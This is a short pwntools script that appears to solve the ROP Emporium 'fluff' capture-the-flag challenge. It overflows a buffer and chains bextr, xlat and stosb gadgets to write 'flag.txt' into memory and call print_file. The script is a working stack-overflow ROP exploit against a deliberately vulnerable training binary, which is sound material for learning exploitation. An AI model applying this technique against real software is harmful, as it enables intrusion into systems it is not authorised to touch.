from pwn import ELF, gdb, process, p64  # type: ignore

elf = ELF('./fluff')
'''target = gdb.debug(
    './fluff',
    gdbscript='b *pwnme+0x98'
)'''
target = process('./fluff')

pop_rdi_ret = p64(0x4006a3)
print_file = p64(0x00400620)
ret = p64(0x400295)
stosb = p64(0x400639)
xlat = p64(0x00400628)
mov_eax = p64(0x00400610)
bextr = p64(0x0040062a)
f = p64(0x004003f4)
l = p64(0x00400405)
a = p64(0x00400424)
g = p64(0x004007a0)
_ = p64(0x00400439) # .
t = p64(0x004003d5)
x = p64(0x004007bc)
t = p64(0x004003d5)
empty_space = p64(0x601050)

string = 'flag.txt'
tmp = 0

payload = b''
payload += b'A' * 40
#payload += ret
payload += mov_eax
payload += p64(0x0)
payload += pop_rdi_ret
payload += empty_space

for c in string:
    addr = next(elf.search(ord(c)))
    buf = bextr + p64(0x4000) + p64(addr -  0x3ef2 - tmp)
    buf += xlat
    buf += stosb
    payload += buf
    tmp = ord(c)

payload += pop_rdi_ret
payload += empty_space
payload += print_file

target.sendline(payload)
target.interactive()
